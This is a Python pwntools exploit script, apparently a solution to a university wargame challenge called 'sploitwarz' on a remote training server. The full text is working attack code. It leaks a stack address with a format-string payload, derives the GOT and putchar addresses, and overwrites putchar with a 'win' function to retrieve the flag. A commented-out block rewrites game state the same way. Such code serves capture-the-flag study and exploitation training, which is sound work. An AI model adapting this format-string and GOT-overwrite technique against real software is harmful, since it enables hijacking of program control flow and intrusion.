#!/usr/bin/python

from pwn import *
import sys
import re

#p = process("binaries/sploitwarz")
#p = gdb.debug("binaries/sploitwarz")
p = remote("wargames.6447.sec.edu.au", 7003)

def send(payload):
	p.sendline(payload)

payload = "aaaa.%1$p"
p.sendline(payload)
p.recvlines(48)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(10)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(43)
	reply = p.recvline()

buffer_addr = re.search('0x(.{8})', reply).group(0)

win = int(buffer_addr, 0) - 0x3978
log.success("Win address at: %s" % (hex(win)))
player = int(buffer_addr, 0) - 0x14
got = player - 0x218
log.success("GOT at: %s" % (hex(got)))
putchar = got + 0x38
log.success("Putchar at: %s" % (hex(putchar)))

p.sendline("")
p.sendline("c")
f = FmtStr(send, offset=9)
f.write(putchar, win)
f.execute_writes()
p.recvlines(66)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(10)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(43)
	reply = p.recvline()

log.info("Overwritten putchar to win")
p.sendline("")
p.recvlines(1)
flag = p.recvline()
log.success("Flag found: %s" % (flag))
p.close()

# Below is to also get win the game, only works on local
'''
p.recvlines(34)

player_qty = player + 0x124
p.sendline("c")
f = FmtStr(send, offset=9)
f.write(player_qty, 10000000)
f.execute_writes()
p.recvlines(37)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(13)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(49)
	reply = p.recvline()

log.info("Overwritten item 5 qty to 10000000")

p.sendline("")
p.sendline("s")
p.sendline("5")
p.sendline("10000000")

log.info("Selling all items")
#p.interactive()
p.recvlines(79)

player_turn = player + 0x4

p.sendline("c")
f.write(player_turn, 30)
f.execute_writes()
p.recvlines(33)
f = FmtStr(send, offset=9)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(17)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(49)
	reply = p.recvline()

log.info("Overwritten turn to 30")

p.sendline("")
print p.recvall()
'''

